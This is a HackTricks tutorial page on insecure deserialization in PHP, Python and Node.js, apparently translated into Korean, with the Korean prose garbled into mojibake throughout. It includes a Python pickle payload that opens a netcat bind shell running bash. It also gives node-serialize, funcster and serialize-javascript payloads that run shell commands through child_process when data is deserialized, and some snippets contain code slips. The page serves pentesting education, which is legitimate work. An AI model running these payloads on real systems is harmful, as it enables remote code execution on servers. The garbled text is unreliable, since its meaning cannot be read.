# Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Serialization**ì€ ê°ì²´ë¥¼ ë³´ì¡´í•  ìˆ˜ ìˆëŠ” í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•ìœ¼ë¡œ ì´í•´ë˜ë©°, ì´ëŠ” ê°ì²´ë¥¼ ì €ì¥í•˜ê±°ë‚˜ í†µì‹  ê³¼ì •ì˜ ì¼ë¶€ë¡œ ì „ì†¡í•  ì˜ë„ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ê°ì²´ê°€ ë‚˜ì¤‘ì— ì¬ìƒì„±ë  ìˆ˜ ìˆë„ë¡ í•˜ì—¬ êµ¬ì¡°ì™€ ìƒíƒœë¥¼ ìœ ì§€í•˜ëŠ” ë° ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.

**Deserialization**ì€ ë°˜ëŒ€ë¡œ ì§ë ¬í™”ì— ë°˜í•˜ëŠ” ê³¼ì •ì…ë‹ˆë‹¤. ì´ëŠ” íŠ¹ì • í˜•ì‹ìœ¼ë¡œ êµ¬ì¡°í™”ëœ ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ ë‹¤ì‹œ ê°ì²´ë¡œ ì¬êµ¬ì„±í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤.

Deserializationì€ **ê³µê²©ìê°€ ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ì¡°ì‘í•˜ì—¬ í•´ë¡œìš´ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê±°ë‚˜ ê°ì²´ ì¬êµ¬ì„± ê³¼ì •ì—ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì˜ˆê¸°ì¹˜ ì•Šì€ ë™ì‘ì„ ìœ ë°œí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ìœ„í—˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

## PHP

PHPì—ì„œëŠ” ì§ë ¬í™” ë° ì—­ì§ë ¬í™” ê³¼ì •ì—ì„œ íŠ¹ì • ë§¤ì§ ë©”ì„œë“œê°€ ì‚¬ìš©ë©ë‹ˆë‹¤:

* `__sleep`: ê°ì²´ê°€ ì§ë ¬í™”ë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ ë©”ì„œë“œëŠ” ì§ë ¬í™”ë˜ì–´ì•¼ í•  ê°ì²´ì˜ ëª¨ë“  ì†ì„± ì´ë¦„ì˜ ë°°ì—´ì„ ë°˜í™˜í•´ì•¼ í•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ë³´ë¥˜ ì¤‘ì¸ ë°ì´í„°ë¥¼ ì»¤ë°‹í•˜ê±°ë‚˜ ìœ ì‚¬í•œ ì •ë¦¬ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__wakeup`: ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ëŠ” ì§ë ¬í™” ì¤‘ì— ì†ì‹¤ëœ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°ì„ ì¬ì„¤ì •í•˜ê³  ë‹¤ë¥¸ ì¬ì´ˆê¸°í™” ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__unserialize`: ì´ ë©”ì„œë“œëŠ” ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ `__wakeup` ëŒ€ì‹  í˜¸ì¶œë©ë‹ˆë‹¤(ì¡´ì¬í•˜ëŠ” ê²½ìš°). ì´ëŠ” `__wakeup`ì— ë¹„í•´ ì—­ì§ë ¬í™” ê³¼ì •ì— ëŒ€í•œ ë” ë§ì€ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
* `__destruct`: ì´ ë©”ì„œë“œëŠ” ê°ì²´ê°€ íŒŒê´´ë˜ê¸° ì§ì „ì´ë‚˜ ìŠ¤í¬ë¦½íŠ¸ê°€ ëë‚  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ íŒŒì¼ í•¸ë“¤ì´ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°ì„ ë‹«ëŠ” ë“±ì˜ ì •ë¦¬ ì‘ì—…ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__toString`: ì´ ë©”ì„œë“œëŠ” ê°ì²´ë¥¼ ë¬¸ìì—´ë¡œ ì·¨ê¸‰í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŠ” íŒŒì¼ì„ ì½ê±°ë‚˜ ê·¸ ì•ˆì˜ í•¨ìˆ˜ í˜¸ì¶œì— ë”°ë¼ ë‹¤ë¥¸ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ê°ì²´ì˜ í…ìŠ¤íŠ¸ í‘œí˜„ì„ íš¨ê³¼ì ìœ¼ë¡œ ì œê³µí•©ë‹ˆë‹¤.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
ê²°ê³¼ë¥¼ ë³´ë©´ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ **`__wakeup`** ë° **`__destruct`** í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ëŸ¬ íŠœí† ë¦¬ì–¼ì—ì„œ **`__toString`** í•¨ìˆ˜ê°€ ì¼ë¶€ ì†ì„±ì„ ì¶œë ¥í•˜ë ¤ê³  í•  ë•Œ í˜¸ì¶œëœë‹¤ê³  í•˜ì§€ë§Œ, í˜„ì¬ëŠ” **ë” ì´ìƒ ê·¸ë ‡ì§€ ì•Šì€ ê²ƒ ê°™ìŠµë‹ˆë‹¤**.

{% hint style="warning" %}
í´ë˜ìŠ¤ì— êµ¬í˜„ëœ ê²½ìš° **`__unserialize(array $data)`** ë©”ì„œë“œê°€ **`__wakeup()`** ëŒ€ì‹  í˜¸ì¶œë©ë‹ˆë‹¤. ì´ ë©”ì„œë“œëŠ” ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ë°°ì—´ë¡œ ì œê³µí•˜ì—¬ ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì†ì„±ì„ ì—­ì§ë ¬í™”í•˜ê³  ì—­ì§ë ¬í™” ì‹œ í•„ìš”í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

ì—¬ê¸°ì—ì„œ ì„¤ëª…ëœ **PHP ì˜ˆì œ**ë¥¼ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ì—¬ê¸° [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ë˜ëŠ” ì—¬ê¸° [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

PHP ìë™ ë¡œë“œ ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ ì„ì˜ì˜ PHP íŒŒì¼ì„ ë¡œë“œí•˜ê³  ë” ë§ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### ì°¸ì¡°ëœ ê°’ ì§ë ¬í™”

ì–´ë–¤ ì´ìœ ë¡œë“  **ë‹¤ë¥¸ ì§ë ¬í™”ëœ ê°’ì— ëŒ€í•œ ì°¸ì¡°**ë¡œ ê°’ì„ ì§ë ¬í™”í•˜ê³  ì‹¶ë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc)ëŠ” PHP ì—­ì§ë ¬í™”ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ë° ë„ì›€ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ ì—­ì§ë ¬í™”ë¥¼ ì•…ìš©í•  ë°©ë²•ì„ **ì°¾ì„ ìˆ˜ ì—†ëŠ” ê²½ìš°ê°€ ë§ìŠµë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ **ì™¸ë¶€ PHP í™•ì¥ ì½”ë“œ**ë¥¼ **ì•…ìš©í•  ìˆ˜ ìˆëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤.**\
ë”°ë¼ì„œ ê°€ëŠ¥í•˜ë‹¤ë©´ ì„œë²„ì˜ `phpinfo()`ë¥¼ í™•ì¸í•˜ê³  **ì¸í„°ë„·ì—ì„œ ê²€ìƒ‰**(ì‹¬ì§€ì–´ **PHPGGCì˜ ê°€ì ¯**ì—ì„œë„)í•˜ì—¬ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥í•œ ê°€ì ¯ì„ ì°¾ì•„ë³´ì„¸ìš”.

### phar:// ë©”íƒ€ë°ì´í„° ì—­ì§ë ¬í™”

íŒŒì¼ì„ ì½ê¸°ë§Œ í•˜ê³  ê·¸ ì•ˆì˜ PHP ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•ŠëŠ” LFIë¥¼ ì°¾ì•˜ë‹¤ë©´, ì˜ˆë¥¼ ë“¤ì–´ _**file\_get\_contents(), fopen(), file() ë˜ëŠ” file\_exists(), md5\_file(), filemtime() ë˜ëŠ” filesize()**_**ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°**. **phar** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ **íŒŒì¼**ì„ **ì½ì„ ë•Œ** ë°œìƒí•˜ëŠ” **ì—­ì§ë ¬í™”**ë¥¼ ì•…ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒ ê²Œì‹œë¬¼ì„ ì½ì–´ë³´ì„¸ìš”:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

ê°ì²´ê°€ ì–¸í”½í´ë  ë•Œ, í•¨ìˆ˜ _\_\_reduce\_\__ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.\
ì•…ìš©ë  ê²½ìš°, ì„œë²„ëŠ” ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

For more information about escaping from **pickle jails** check:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

ë‹¤ìŒ í˜ì´ì§€ëŠ” **YAMLì—ì„œ ì•ˆì „í•˜ì§€ ì•Šì€ ì—­ì§ë ¬í™”ë¥¼ ì•…ìš©í•˜ëŠ” ê¸°ìˆ **ì„ ì œì‹œí•˜ê³  **Pickle, PyYAML, jsonpickle ë° ruamel.yaml**ì— ëŒ€í•œ RCE ì—­ì§ë ¬í™” í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë„êµ¬ë¡œ ë§ˆë¬´ë¦¬ë©ë‹ˆë‹¤:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **ëŠ” PHPë‚˜ Pythonì²˜ëŸ¼ ê°ì²´ ìƒì„±ì„ ìœ„í•´ ì‹¤í–‰ë˜ëŠ” "ë§ˆë²•" í•¨ìˆ˜ê°€ ì—†ìŠµë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ **`toString`**, **`valueOf`**, **`toJSON`**ê³¼ ê°™ì´ **ì§ì ‘ í˜¸ì¶œí•˜ì§€ ì•Šê³ ë„ ìì£¼ ì‚¬ìš©ë˜ëŠ” í•¨ìˆ˜**ê°€ ìˆìŠµë‹ˆë‹¤.\
ì—­ì§ë ¬í™”ë¥¼ ì•…ìš©í•˜ë©´ ì´ëŸ¬í•œ í•¨ìˆ˜ë¥¼ **íƒ€í˜‘í•˜ì—¬ ë‹¤ë¥¸ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìœ¼ë©° (í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ ì•…ìš©í•  ê°€ëŠ¥ì„±) í˜¸ì¶œë  ë•Œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•¨ìˆ˜ë¥¼ **ì§ì ‘ í˜¸ì¶œí•˜ì§€ ì•Šê³  í˜¸ì¶œí•˜ëŠ” ë˜ ë‹¤ë¥¸ "ë§ˆë²•" ë°©ë²•**ì€ **ë¹„ë™ê¸° í•¨ìˆ˜**(í”„ë¼ë¯¸ìŠ¤)ì—ì„œ ë°˜í™˜ëœ ê°ì²´ë¥¼ **íƒ€í˜‘í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤**. ì™œëƒí•˜ë©´, ê·¸ **ë°˜í™˜ ê°ì²´**ë¥¼ **"then"ì´ë¼ëŠ” í•¨ìˆ˜í˜• ì†ì„±ì„ ê°€ì§„ ë‹¤ë¥¸ **í”„ë¼ë¯¸ìŠ¤**ë¡œ **ë³€í™˜**í•˜ë©´, ë‹¤ë¥¸ í”„ë¼ë¯¸ìŠ¤ì— ì˜í•´ ë°˜í™˜ë˜ê¸° ë•Œë¬¸ì— **ì‹¤í–‰ë©ë‹ˆë‹¤**. _ìì„¸í•œ ì •ë³´ëŠ”_ [_**ì´ ë§í¬**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ë° `prototype` ì˜¤ì—¼

ì´ ê¸°ìˆ ì— ëŒ€í•´ ë°°ìš°ê³  ì‹¶ë‹¤ë©´ **ë‹¤ìŒ íŠœí† ë¦¬ì–¼ì„ í™•ì¸í•˜ì„¸ìš”**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” í•¨ìˆ˜ë¥¼ ì§ë ¬í™”í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì˜ˆ:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
The **serialised object** will looks like:  
**ì§ë ¬í™”ëœ ê°ì²´**ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³´ì…ë‹ˆë‹¤:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
You can see in the example that when a function is serialized the `_$$ND_FUNC$$_` flag is appended to the serialized object.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

As you may see in the last chunk of code, **if the flag is found** `eval` is used to deserialize the function, so basically **user input if being used inside the `eval` function**.

However, **just serialising** a function **won't execute it** as it would be necessary that some part of the code is **calling `y.rce`** in our example and that's highly **unlikable**.\
Anyway, you could just **modify the serialised object** **adding some parenthesis** in order to auto execute the serialized function when the object is deserialized.\
In the next chunk of code **notice the last parenthesis** and how the `unserialize` function will automatically execute the code:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
ì´ì „ì— ì–¸ê¸‰í–ˆë“¯ì´, ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” `_$$ND_FUNC$$_` ì´í›„ì˜ ì½”ë“œë¥¼ ê°€ì ¸ì™€ì„œ **ì‹¤í–‰í•©ë‹ˆë‹¤** `eval`ì„ ì‚¬ìš©í•˜ì—¬. ë”°ë¼ì„œ **ì½”ë“œë¥¼ ìë™ìœ¼ë¡œ ì‹¤í–‰**í•˜ë ¤ë©´ **í•¨ìˆ˜ ìƒì„±** ë¶€ë¶„ê³¼ ë§ˆì§€ë§‰ ê´„í˜¸ë¥¼ **ì‚­ì œí•˜ê³ ** ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ **JS ì›ë¼ì´ë„ˆë¥¼ ì‹¤í–‰**í•˜ë©´ ë©ë‹ˆë‹¤:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
ì—¬ê¸°ì—ì„œ ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ [**ì¶”ê°€ ì •ë³´**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**ì˜ ì£¼ëª©í•  ë§Œí•œ ì ì€ **í‘œì¤€ ë‚´ì¥ ê°ì²´**ì˜ ì ‘ê·¼ ë¶ˆê°€ëŠ¥ì„±ì…ë‹ˆë‹¤. ì´ë“¤ì€ ì ‘ê·¼ ê°€ëŠ¥í•œ ë²”ìœ„ë¥¼ ë²—ì–´ë‚©ë‹ˆë‹¤. ì´ ì œí•œìœ¼ë¡œ ì¸í•´ ë‚´ì¥ ê°ì²´ì—ì„œ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ë ¤ëŠ” ì½”ë“œ ì‹¤í–‰ì´ ë°©ì§€ë˜ì–´, `console.log()`ë‚˜ `require(something)`ì™€ ê°™ì€ ëª…ë ¹ì„ ì‚¬ìš©í•  ë•Œ `"ReferenceError: console is not defined"`ì™€ ê°™ì€ ì˜ˆì™¸ê°€ ë°œìƒí•©ë‹ˆë‹¤.

ì´ ì œí•œì—ë„ ë¶ˆêµ¬í•˜ê³ , ëª¨ë“  í‘œì¤€ ë‚´ì¥ ê°ì²´ë¥¼ í¬í•¨í•œ ì „ì—­ ì»¨í…ìŠ¤íŠ¸ì— ëŒ€í•œ ì „ì²´ ì ‘ê·¼ì„ ë³µì›í•˜ëŠ” ê²ƒì€ íŠ¹ì • ì ‘ê·¼ ë°©ì‹ì„ í†µí•´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì „ì—­ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì§ì ‘ í™œìš©í•¨ìœ¼ë¡œì¨ ì´ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ìŠ¤ë‹ˆí«ì„ ì‚¬ìš©í•˜ì—¬ ì ‘ê·¼ì„ ì¬ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**ìì„¸í•œ ì •ë³´ëŠ” ì´ ì¶œì²˜ë¥¼ ì½ì–´ë³´ì„¸ìš”**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** íŒ¨í‚¤ì§€ëŠ” ì§ë ¬í™” ëª©ì ìœ¼ë¡œë§Œ ì„¤ê³„ë˜ì—ˆìœ¼ë©°, ë‚´ì¥ëœ ì—­ì§ë ¬í™” ê¸°ëŠ¥ì´ ì—†ìŠµë‹ˆë‹¤. ì‚¬ìš©ìëŠ” ì—­ì§ë ¬í™”ë¥¼ ìœ„í•œ ìì‹ ì˜ ë°©ë²•ì„ êµ¬í˜„í•  ì±…ì„ì´ ìˆìŠµë‹ˆë‹¤. ê³µì‹ ì˜ˆì œì—ì„œëŠ” ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ì—­ì§ë ¬í™”í•˜ê¸° ìœ„í•´ `eval`ì˜ ì§ì ‘ ì‚¬ìš©ì„ ì œì•ˆí•©ë‹ˆë‹¤:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
ì´ í•¨ìˆ˜ê°€ ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤ë©´ **ì‰½ê²Œ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**ìì„¸í•œ ì •ë³´ëŠ” ì´ ì¶œì²˜ë¥¼ ì½ì–´ë³´ì„¸ìš”**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo ë¼ì´ë¸ŒëŸ¬ë¦¬

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•…ìš©í•˜ì—¬ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaì—ì„œëŠ” **ì—­ì§ë ¬í™” ì½œë°±ì´ ì—­ì§ë ¬í™” ê³¼ì • ì¤‘ì— ì‹¤í–‰ë©ë‹ˆë‹¤**. ì´ ì‹¤í–‰ì€ ê³µê²©ìê°€ ì´ëŸ¬í•œ ì½œë°±ì„ ìœ ë°œí•˜ëŠ” ì•…ì„± í˜ì´ë¡œë“œë¥¼ ì œì‘í•˜ì—¬ ì•…ì„± í–‰ë™ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì§€ë¬¸

#### í™”ì´íŠ¸ ë°•ìŠ¤

ì½”ë“œë² ì´ìŠ¤ì—ì„œ ì ì¬ì ì¸ ì§ë ¬í™” ì·¨ì•½ì ì„ ì‹ë³„í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ê²€ìƒ‰í•˜ì„¸ìš”:

* `Serializable` ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•˜ëŠ” í´ë˜ìŠ¤.
* `java.io.ObjectInputStream`, `readObject`, `readUnshare` í•¨ìˆ˜ì˜ ì‚¬ìš©.

ë‹¤ìŒì— íŠ¹íˆ ì£¼ì˜í•˜ì„¸ìš”:

* ì™¸ë¶€ ì‚¬ìš©ìê°€ ì •ì˜í•œ ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜ ì‚¬ìš©ë˜ëŠ” `XMLDecoder`.
* XStream ë²„ì „ì´ 1.46 ì´í•˜ì¸ ê²½ìš° ì§ë ¬í™” ë¬¸ì œì— ì·¨ì•½í•œ `XStream`ì˜ `fromXML` ë©”ì„œë“œ.
* `readObject` ë©”ì„œë“œì™€ ê²°í•©ëœ `ObjectInputStream`.
* `readObject`, `readObjectNodData`, `readResolve`, ë˜ëŠ” `readExternal`ê³¼ ê°™ì€ ë©”ì„œë“œì˜ êµ¬í˜„.
* `ObjectInputStream.readUnshared`.
* `Serializable`ì˜ ì¼ë°˜ì ì¸ ì‚¬ìš©.

#### ë¸”ë™ ë°•ìŠ¤

ë¸”ë™ ë°•ìŠ¤ í…ŒìŠ¤íŠ¸ì˜ ê²½ìš°, java ì§ë ¬í™” ê°ì²´ë¥¼ ë‚˜íƒ€ë‚´ëŠ” íŠ¹ì • **ì„œëª… ë˜ëŠ” "ë§¤ì§ ë°”ì´íŠ¸"**ë¥¼ ì°¾ìœ¼ì„¸ìš” ( `ObjectInputStream`ì—ì„œ ìœ ë˜):

* 16ì§„ìˆ˜ íŒ¨í„´: `AC ED 00 05`.
* Base64 íŒ¨í„´: `rO0`.
* `Content-type`ì´ `application/x-java-serialized-object`ë¡œ ì„¤ì •ëœ HTTP ì‘ë‹µ í—¤ë”.
